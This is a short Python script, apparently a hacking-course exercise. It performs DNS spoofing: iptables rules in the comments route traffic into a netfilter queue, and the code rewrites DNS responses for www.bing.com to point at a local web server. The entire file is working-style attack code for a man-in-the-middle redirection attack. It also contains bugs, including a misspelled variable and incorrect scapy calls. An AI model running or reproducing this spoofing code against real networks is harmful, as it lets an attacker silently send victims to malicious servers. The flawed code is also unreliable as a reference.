#!/usr/bin/env python

#command 1: sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
#           sudo iptables -I INPUT -j NFQUEUE --queue-num 0
#           sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#command 2: sudo iptables --flush
#command 3: ping -c 1 bing.com


import scapy.all as scapy
import netfilterqueue

web_server = "192.168.0.40"

def process_packet(packet):
    print("[+] Filtered packet is queued in nfq 0\n")
    scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy format
    if scapy_packet.haslayer(scapy.DNSRR()):  # DNSRQ() for request and DNSRR() for response
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata=web_server)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].chksum
            del scpay_packet[scapy.UDP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))  # convert back to netfilterqueue format

        #print(scapy_packet.show())   # this line can be only used for scapy formatted data
    #print(packet)               # this line can be used to print the type of pkt and size
    #print(packet.get_payload()) # this line can be used to print raw data
    #packet.drop()
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

